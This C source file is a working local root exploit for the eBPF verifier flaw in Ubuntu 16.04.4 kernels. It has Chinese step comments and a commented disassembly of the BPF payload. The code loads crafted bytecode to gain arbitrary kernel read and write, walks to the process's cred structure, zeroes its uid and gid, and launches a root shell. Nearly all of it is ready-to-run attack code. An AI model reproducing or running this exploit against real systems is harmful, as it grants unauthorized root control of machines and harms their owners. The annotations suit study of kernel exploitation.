/*
 * Ubuntu 16.04.4 kernel priv esc
 *
 * all credits to @bleidl
 * - vnik
 */

// Tested on:
// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
// if different kernel adjust CRED offset + check kernel stack size
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <linux/bpf.h>
#include <linux/unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <stdint.h>

#define PHYS_OFFSET 0xffff880000000000
#define CRED_OFFSET 0x9b8 //4.4.0-116-generic中是0x5f8，v4.4.110中是0x9b8
#define UID_OFFSET 4
#define LOG_BUF_SIZE 65536
#define PROGSIZE 328 //-32  41条指令，41*8=328

int sockets[2];
int mapfd, progfd;

char *__prog = 	"\xb4\x09\x00\x00\xff\xff\xff\xff"
		"\x55\x09\x02\x00\xff\xff\xff\xff"
		"\xb7\x00\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x18\x19\x00\x00\x03\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x00\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x06\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x01\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x07\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x02\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x08\x00\x00\x00\x00\x00\x00"
		"\xbf\x02\x00\x00\x00\x00\x00\x00"
		"\xb7\x00\x00\x00\x00\x00\x00\x00"
		"\x55\x06\x03\x00\x00\x00\x00\x00"
		"\x79\x73\x00\x00\x00\x00\x00\x00"
		"\x7b\x32\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x55\x06\x02\x00\x01\x00\x00\x00"
		"\x7b\xa2\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x7b\x87\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00";

char bpf_log_buf[LOG_BUF_SIZE];

static int bpf_prog_load(enum bpf_prog_type prog_type,
		  const struct bpf_insn *insns, int prog_len,
		  const char *license, int kern_version) {
	union bpf_attr attr = {
		.prog_type = prog_type,
		.insns = (__u64)insns,
		.insn_cnt = prog_len / sizeof(struct bpf_insn),
		.license = (__u64)license,
		.log_buf = (__u64)bpf_log_buf,
		.log_size = LOG_BUF_SIZE,
		.log_level = 1,
	};

	attr.kern_version = kern_version;

	bpf_log_buf[0] = 0;

	return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		   int max_entries) {
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries
	};

	return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(uint64_t key, uint64_t value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)&key,
		.value = (__u64)&value,
		.flags = 0,
	};

	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int bpf_lookup_elem(void *key, void *value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)key,
		.value = (__u64)value,
	};

	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

static void __exit(char *err) {
	fprintf(stderr, "error: %s\n", err);
	exit(-1);
}
// 1. 准备工作: 创建3个map，加载用户代码
static void prep(void) {
	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);
	if (mapfd < 0)
		__exit(strerror(errno));
	puts("[+] mapfd finished");
	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
			(struct bpf_insn *)__prog, PROGSIZE, "GPL", 0);

	if (progfd < 0)
		__exit(strerror(errno));
	puts("[+] bpf_prog_load finished");
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
		__exit(strerror(errno));
	puts("[+] socketpair finished");
	if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
		__exit(strerror(errno));
	puts("[+] setsockopt finished");
}

static void writemsg(void) {
	char buffer[64];

	ssize_t n = write(sockets[0], buffer, sizeof(buffer));

	if (n < 0) {
		perror("write");
		return;
	}
	if (n != sizeof(buffer))
		fprintf(stderr, "short write: %lu\n", n);
}

#define __update_elem(a, b, c) \
	bpf_update_elem(0, (a)); \
	bpf_update_elem(1, (b)); \
	bpf_update_elem(2, (c)); \
	writemsg();

static uint64_t get_value(int key) {
	uint64_t value;

	if (bpf_lookup_elem(&key, &value))
		__exit(strerror(errno));

	return value;
}

static uint64_t __get_fp(void) {   // 功能1: 读取r10/rbp寄存器值
	__update_elem(1, 0, 0);

	return get_value(2);
}

static uint64_t __read(uint64_t addr) {  // 功能0: 读取map[1]指向的值到map[2]
	__update_elem(0, addr, 0);

	return get_value(2);
}

static void __write(uint64_t addr, uint64_t val) { // 功能2: 将map[2] 值写到map[1]指向的位置
	__update_elem(2, addr, val);
}

static uint64_t get_sp(uint64_t addr) {   
	return addr & ~(0x4000 - 1);
}

static void pwn(void) {
	uint64_t fp, sp, task_struct, credptr, uidptr;
    // 2. 泄露栈地址
	fp = __get_fp();
	if (fp < PHYS_OFFSET)
		__exit("[-] bogus fp");
	// 3. 栈地址计算得到current地址，内核栈最低地址,存放thread_info结构（addr & ~(0x4000 - 1)）
	sp = get_sp(fp);
	if (sp < PHYS_OFFSET)
		__exit("[-] bogus sp");
	// 4. 读取task_struct地址，位于thread_info第1个元素
	task_struct = __read(sp);
	if (task_struct < PHYS_OFFSET)
		__exit("[-] bogus task ptr");
	printf("[+] task_struct = %lx\n", task_struct);
    // 5. 读取cred地址，位于task_struct偏移0x9b8处
	credptr = __read(task_struct + CRED_OFFSET); // cred
	if (credptr < PHYS_OFFSET)
		__exit("[-] bogus cred ptr");
    // 6. 得到uid地址，修改uid为0。修改24字节有执行权限
	uidptr = credptr + UID_OFFSET; // uid
	if (uidptr < PHYS_OFFSET)
		__exit("[-] bogus uid ptr");

	printf("[+] uidptr = %lx\n", uidptr);
	__write(uidptr, 0); // set both uid and gid to 0
	__write(uidptr+8, 0);
	__write(uidptr+16, 0);

	if (getuid() == 0) {
		printf("[+] spawning root shell\n");
		system("id");
		system("/bin/sh");
		exit(0);
	}

	__exit("[-] not vulnerable?");
}

int main(int argc, char **argv) {
	prep();
	pwn();
	return 0;
}
/*
[0]: ALU_MOV_K(0,9,0x0,0xffffffff) /* r9 = (u32)0xFFFFFFFF  
[1]: JMP_JNE_K(0,9,0x2,0xffffffff) /* if (r9 == -1) {       
[2]: ALU64_MOV_K(0,0,0x0,0x0)      /*   exit(0);             
[3]: JMP_EXIT(0,0,0x0,0x0)
[4]: LD_IMM_DW(1,9,0x0,0x3)        /* r9=mapfd              
[5]: maybe padding // 以存放mapfd地址

//1.BPF_MAP_GET(0, BPF_REG_6)  r6=op，取map的第1个元素放到r6
[6]: ALU64_MOV_X(9,1,0x0,0x0)      /* r1 = r9                
[7]: ALU64_MOV_X(10,2,0x0,0x0)     /* r2 = fp               
[8]: ALU64_ADD_K(0,2,0x0,0xfffffffc)/* r2 = fp - 4            
[9]: ST_MEM_W(0,10,0xfffc,0x0)     /* *(u32 *)(fp - 4) = 0 
[10]: JMP_CALL(0,0,0x0,0x1)//BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem)
[11]: JMP_JNE_K(0,0,0x1,0x0)      /* if (r0 == 0)           
[12]: JMP_EXIT(0,0,0x0,0x0)       /*   exit(0);             
[13]: LDX_MEM_DW(0,6,0x0,0x0)     /* r6 = *(u64 *)(r0)   

//2.BPF_MAP_GET(1, BPF_REG_7)  r7=address，取map的第2个元素放到r7
[14]: ALU64_MOV_X(9,1,0x0,0x0)    /* r1 = r9               
[15]: ALU64_MOV_X(10,2,0x0,0x0)   /* r2 = fp               
[16]: ALU64_ADD_K(0,2,0x0,0xfffffffc)/* r2 = fp - 4           
[17]: ST_MEM_W(0,10,0xfffc,0x1)   /* *(u32 *)(fp - 4) = 1 
[18]: JMP_CALL(0,0,0x0,0x1)//BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem)
[19]: JMP_JNE_K(0,0,0x1,0x0)      /* if (r0 == 0)           
[20]: JMP_EXIT(0,0,0x0,0x0)       /*   exit(0);            
[21]: LDX_MEM_DW(0,7,0x0,0x0)     /* r7 = *(u64 *)(r0)  

//3.#BPF_MAP_GET(2, BPF_REG_8)  r8=value，取map的第3个元素放到r8
[22]: ALU64_MOV_X(9,1,0x0,0x0)    /* r1 = r9               
[23]: ALU64_MOV_X(10,2,0x0,0x0)   /* r2 = fp              
[24]: ALU64_ADD_K(0,2,0x0,0xfffffffc)/* r2 = fp - 4           
[25]: ST_MEM_W(0,10,0xfffc,0x2)   /* *(u32 *)(fp - 4) = 2 
[26]: JMP_CALL(0,0,0x0,0x1)//#BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem)
[27]: JMP_JNE_K(0,0,0x1,0x0)      /* if (r0 == 0)          
[28]: JMP_EXIT(0,0,0x0,0x0)       /*   exit(0);            
[29]: LDX_MEM_DW(0,8,0x0,0x0)     /* r8 = *(u64 *)(r0)   

[30]: ALU64_MOV_X(0,2,0x0,0x0)    /* r2 = r0               
[31]: ALU64_MOV_K(0,0,0x0,0x0)    /* r0 = 0  for exit(0)   
[32]: JMP_JNE_K(0,6,0x3,0x0)      /* if (r6 != 0) jmp to 36 
[33]: LDX_MEM_DW(7,3,0x0,0x0)     /* r3 = [r7]             
[34]: STX_MEM_DW(3,2,0x0,0x0)     /* [r2] = r3             
[35]: JMP_EXIT(0,0,0x0,0x0)       /* exit(0)               
[36]: JMP_JNE_K(0,6,0x2,0x1)      /* if (r6 != 1) jmp to 39 
[37]: STX_MEM_DW(10,2,0x0,0x0)    /* [r2]=rbp             
[38]: JMP_EXIT(0,0,0x0,0x0)       /* exit(0);             
[39]: STX_MEM_DW(8,7,0x0,0x0)     /* [r7]=r8              
[40]: JMP_EXIT(0,0,0x0,0x0)       /* exit(0);            

*/

/*
char *__prog = "\x18\x19\x00\x00\x03\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x00\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x06\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x01\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x07\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x02\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x08\x00\x00\x00\x00\x00\x00"
		"\xbf\x02\x00\x00\x00\x00\x00\x00"
		"\xb7\x00\x00\x00\x00\x00\x00\x00"
		"\x55\x06\x03\x00\x00\x00\x00\x00"
		"\x79\x73\x00\x00\x00\x00\x00\x00"
		"\x7b\x32\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x55\x06\x02\x00\x01\x00\x00\x00"
		"\x7b\xa2\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x7b\x87\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00";
*/
